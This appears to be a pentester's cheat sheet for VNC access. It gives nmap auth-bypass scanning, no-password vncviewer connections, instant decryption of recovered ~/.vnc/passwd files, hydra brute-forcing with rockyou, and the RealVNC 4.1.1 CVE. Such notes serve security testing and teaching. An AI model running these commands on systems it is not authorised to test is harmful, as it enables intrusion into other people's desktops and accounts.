## Goal
Connect with a found or no password for a GUI session. VNC(5900+) sometimes has no auth, or a password that's obfuscated (not hashed) and instantly recoverable.

**Checklist**
- [ ] no-auth connect works?
- [ ] found a ~/.vnc/passwd file? (decrypt, don't crack)
- [ ] version has a CVE? (RealVNC 4.1.1 auth bypass)

# Commands

### Step 1: Scan
```bash
nmap -p5900 --script "vnc-info,vnc-title,realvnc-auth-bypass" $IP
# port -> display: 5900=:0, 5901=:1, ...
```

### Step 2: Connect
```bash
vncviewer $IP:5900                       # no-auth, or prompts for a password
vncviewer -passwd pass.file $IP:5900     # using a recovered password file
```

### Step 3: Recover / brute a VNC password
```bash
# a found ~/.vnc/passwd is DES-obfuscated with a FIXED key -> decrypt instantly:
vncpwd passwd                            # returns the plaintext
# brute a live server:
hydra -P /usr/share/wordlists/rockyou.txt vnc://$IP
```

### Helpline
```bash
# WHAT TO LOOK FOR: a ~/.vnc/passwd during enum is a fixed-key-OBFUSCATED password, NOT a hash
#   -> run vncpwd to decrypt it instantly (don't waste time cracking).
# no-auth VNC = instant desktop, often already logged in as a user.
# RealVNC 4.1.1 -> CVE-2006-2369 auth bypass.
```
